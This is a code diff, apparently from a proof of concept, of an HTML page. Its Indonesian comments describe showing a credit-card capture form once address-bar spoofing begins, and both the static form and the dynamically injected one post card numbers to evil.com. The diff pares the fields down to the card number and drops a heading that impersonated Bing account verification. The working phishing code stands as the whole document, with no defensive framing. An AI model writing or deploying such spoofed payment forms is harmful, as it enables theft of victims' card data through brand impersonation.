@@ -9,44 +9,24 @@
     
     <div id="credit-card-form" style="display:none;">
         <form method="POST" action="https://evil.com/submit" autocomplete="on">
-            <label for="name">Nama di Kartu:</label><br>
-            <input type="text" id="name" name="name" placeholder="Nama Lengkap" autocomplete="name" required><br><br>
-            
             <label for="cc-number">Nomor Kartu Kredit:</label><br>
             <input type="text" id="cc-number" name="cc-number" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required><br><br>
-            
-            <label for="cc-exp">Tanggal Kedaluwarsa:</label><br>
-            <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required><br><br>
-            
-            <label for="cc-csc">CVV:</label><br>
-            <input type="text" id="cc-csc" name="cc-csc" placeholder="123" autocomplete="cc-csc" required><br><br>
-            
             <input type="submit" value="Verifikasi Pembayaran">
         </form>
     </div>
 
     <script>
         function startSpoof() {
-            // Langkah 1: Tampilkan form setelah spoofing address bar dimulai
+            // Langkah 1: Tampilkan form nomor kartu kredit setelah spoofing address bar dimulai
             document.getElementById("credit-card-form").style.display = "block";
 
             // Langkah 2: Buat elemen form dinamis tanpa mengganti seluruh halaman
             const spoofedForm = document.createElement('div');
             spoofedForm.innerHTML = `
-                <h2>Masukkan Informasi Kartu Kredit Anda untuk Verifikasi Akun Bing</h2>
+                <h2>Masukkan Nomor Kartu Kredit Anda untuk Verifikasi Pembayaran</h2>
                 <form method="POST" action="https://evil.com/submit" autocomplete="on">
-                    <label for="name">Nama di Kartu:</label><br>
-                    <input type="text" id="name" name="name" placeholder="Nama Lengkap" autocomplete="name" required><br><br>
-                    
                     <label for="cc-number">Nomor Kartu Kredit:</label><br>
                     <input type="text" id="cc-number" name="cc-number" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required><br><br>
-                    
-                    <label for="cc-exp">Tanggal Kedaluwarsa:</label><br>
-                    <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required><br><br>
-                    
-                    <label for="cc-csc">CVV:</label><br>
-                    <input type="text" id="cc-csc" name="cc-csc" placeholder="123" autocomplete="cc-csc" required><br><br>
-                    
                     <input type="submit" value="Verifikasi Pembayaran">
                 </form>
             `;
